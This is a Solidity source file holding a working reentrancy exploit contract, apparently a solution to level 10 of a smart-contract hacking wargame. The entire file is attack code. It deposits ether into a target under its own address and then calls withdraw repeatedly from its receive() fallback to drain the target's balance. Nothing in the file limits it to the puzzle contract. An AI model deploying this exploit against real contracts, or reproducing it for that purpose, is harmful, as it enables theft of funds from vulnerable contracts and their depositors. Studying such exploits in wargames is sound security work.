// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Level10ReentrancyExploit {
    address target;
    uint256 temp;
    
    constructor (address _target) payable public {
        target = _target;
        temp = msg.value;
    }

    function donate() public {
        (bool success, ) = target.call{value: temp}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Faile to call donate");
    }

    function attack() public {
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", temp));
        require(success, "Faile to call withdraw");
    }

    receive() external payable {
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", temp));
        require(success, "Faile to call withdraw");
    }

}